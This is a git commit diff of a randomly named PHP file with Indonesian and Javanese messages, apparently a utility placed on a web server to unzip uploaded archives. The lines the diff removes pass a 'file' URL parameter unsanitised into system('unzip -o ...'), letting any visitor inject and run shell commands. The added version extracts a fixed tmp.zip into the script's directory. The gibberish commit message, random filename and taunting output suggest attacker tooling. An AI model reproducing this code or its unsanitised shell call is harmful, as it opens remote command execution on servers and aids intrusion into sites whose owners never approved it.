084b7aa382a68b5d11c9d57ac67962b714a8781c
antoniola <renata.cantiek@gmail.com>
2016-11-12 22:26:36 +0700

    ew4y5edsxzfghf
    dhjykutcg fcf bvnggjh

--- 3t32werfeeehr56y5ty.php
+++ 3t32werfeeehr56y5ty.php
@@ -1,39 +1,16 @@
-<?php
- $file = $_GET['file'];
+ <?php
+$file = 'tmp.zip';
  
-    if (isset($file))
-    {
-       echo "Unzip " . $file . "<br>";
-       system('unzip -o ' . $file);
-       exit;
-    }
+$path = pathinfo( realpath( $file ), PATHINFO_DIRNAME );
  
-    // create a handler to read the directory contents
-    $handler = opendir(".");
- 
-    echo "<font color=lime>Silakan Pilih File Zip Yang Mau di Extract: " . "<br>";
- 
-    // A blank action field posts the form to itself
-    echo '<FORM action="" method="get">';
- 
-    $found = FALSE; // Used to see if there were any valid files
- 
-    // keep going until all files in directory have been read
-    while ($file = readdir($handler))
-    {
-        if (preg_match ("/.zip$/i", $file))
-        {
-            echo '<input type="radio" name="file" value=' . $file . '> ' . $file . '<br>';
-            $found = true;
-        }
-    }
- 
-    closedir($handler);
- 
-    if ($found == FALSE)
-        echo "Tidak Ada File Berekstensi Zip Yang Ditemukan<br></font>";
-    else
-        echo '<p class=blink><font color=red>Peringatan: File Yang Ada Akan Ditimpa </p></font><br><INPUT type="submit" value="Extact Zip">';
- 
-    echo "</FORM>";
+$zip = new ZipArchive;
+$res = $zip->open($file);
+if ($res === TRUE) {
+    $zip->extractTo( $path );
+    $zip->close();
+    echo "<center><font color=lime>File $file Berhasil Di Extract Di ====> $path </font>";
+}
+else {
+    echo "<font color=red>JANCOK !! Server Bosok Gak Iso Gae Extract iki Cok $file </font></center>";
+}
 ?>
